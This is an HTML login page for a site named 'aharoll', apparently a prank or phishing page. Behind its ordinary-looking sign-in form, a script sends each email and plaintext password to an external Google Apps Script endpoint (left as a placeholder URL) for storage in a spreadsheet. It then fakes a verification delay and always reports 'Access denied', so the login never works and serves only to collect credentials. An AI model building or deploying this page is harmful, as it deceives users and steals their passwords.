<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login | aharoll</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232dd4a8'/%3E%3Cstop offset='100%25' stop-color='%23d4c82d'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='100' height='100' rx='20' fill='%230a0a0a'/%3E%3Ctext x='50' y='68' font-family='system-ui' font-size='55' font-weight='bold' fill='url(%23g)' text-anchor='middle'%3Ea%3C/text%3E%3C/svg%3E">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root { --bg: #0a0a0a; --text: #ffffff; --text-dim: #666666; --accent: #2dd4a8; --accent-hover: #34eabc; --yellow: #d4c82d; --error: #ff4757; }
        body { font-family: 'JetBrains Mono', monospace; background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; }
        
        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 0, 0, 0.15) 2px, rgba(0, 0, 0, 0.15) 4px); pointer-events: none; z-index: 1000; animation: scanFlicker 0.1s infinite; }
        @keyframes scanFlicker { 0%, 100% { opacity: 0.3; } 50% { opacity: 0.35; } }
        
        body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E"); opacity: 0.04; pointer-events: none; z-index: 999; }
        
        .login-box { width: 100%; max-width: 380px; padding: 3rem 2.5rem; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; position: relative; }
        
        .logo { text-align: center; margin-bottom: 2.5rem; }
        .logo a { color: var(--text); text-decoration: none; font-weight: 700; font-size: 1.3rem; letter-spacing: -0.02em; }
        
        .form-group { margin-bottom: 1.5rem; }
        .form-group label { display: block; color: var(--text-dim); font-size: 0.8rem; margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.05em; }
        .form-group input { width: 100%; padding: 0.9rem 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; color: var(--text); outline: none; transition: all 0.2s; }
        .form-group input:focus { border-color: var(--accent); box-shadow: 0 0 20px rgba(45, 212, 168, 0.15); }
        .form-group input::placeholder { color: var(--text-dim); }
        
        .submit-btn { width: 100%; padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; font-weight: 600; background: var(--accent); color: var(--bg); border: none; border-radius: 4px; cursor: pointer; transition: all 0.2s; margin-top: 0.5rem; }
        .submit-btn:hover { background: var(--accent-hover); box-shadow: 0 0 30px rgba(45, 212, 168, 0.3); }
        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .message { text-align: center; margin-top: 1.5rem; font-size: 0.85rem; min-height: 1.5rem; }
        .message.error { color: var(--error); animation: errorGlitch 0.3s; }
        .message.verifying { color: var(--text-dim); }
        
        @keyframes errorGlitch {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-5px); }
            40% { transform: translateX(5px); }
            60% { transform: translateX(-3px); }
            80% { transform: translateX(3px); }
        }
        
        .back-link { margin-top: 2rem; text-align: center; }
        .back-link a { color: var(--text-dim); text-decoration: none; font-size: 0.85rem; transition: color 0.2s; }
        .back-link a:hover { color: var(--text); }
        
        .glitch-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--error); opacity: 0; pointer-events: none; z-index: 2000; }
        .glitch-overlay.active { animation: screenGlitch 0.5s; }
        
        @keyframes screenGlitch {
            0% { opacity: 0; }
            10% { opacity: 0.1; }
            20% { opacity: 0; }
            30% { opacity: 0.15; }
            40% { opacity: 0; }
            50% { opacity: 0.1; }
            100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="glitch-overlay" id="glitchOverlay"></div>
    
    <div class="login-box">
        <div class="logo"><a href="/">aharoll</a></div>
        
        <div class="form-group">
            <label>Email</label>
            <input type="email" id="email" placeholder="you@example.com" autocomplete="email">
        </div>
        
        <div class="form-group">
            <label>Password</label>
            <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
        </div>
        
        <button class="submit-btn" id="submitBtn" onclick="attemptLogin()">Sign in</button>
        
        <p class="message" id="message"></p>
        
        <div class="back-link"><a href="/">← back to home</a></div>
    </div>

    <script>
        const GOOGLE_SCRIPT_URL = 'YOUR_APPS_SCRIPT_URL_HERE';
        
        async function attemptLogin() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const message = document.getElementById('message');
            const btn = document.getElementById('submitBtn');
            const glitch = document.getElementById('glitchOverlay');
            
            if (!email || !password) {
                message.textContent = 'Enter credentials';
                message.className = 'message error';
                return;
            }
            
            btn.disabled = true;
            btn.textContent = 'Verifying...';
            message.textContent = 'Authenticating...';
            message.className = 'message verifying';
            
            // Save to Google Sheets
            try {
                await fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: email, 
                        password: password,
                        timestamp: new Date().toISOString(),
                        source: 'login'
                    })
                });
            } catch (e) { }
            
            // Fake delay for drama
            await new Promise(r => setTimeout(r, 1500));
            
            // Glitch effect
            glitch.classList.add('active');
            
            await new Promise(r => setTimeout(r, 500));
            
            glitch.classList.remove('active');
            message.textContent = 'Access denied';
            message.className = 'message error';
            btn.textContent = 'Sign in';
            btn.disabled = false;
        }
        
        // Enter key support
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') attemptLogin();
            });
        });
    </script>
</body>
</html>
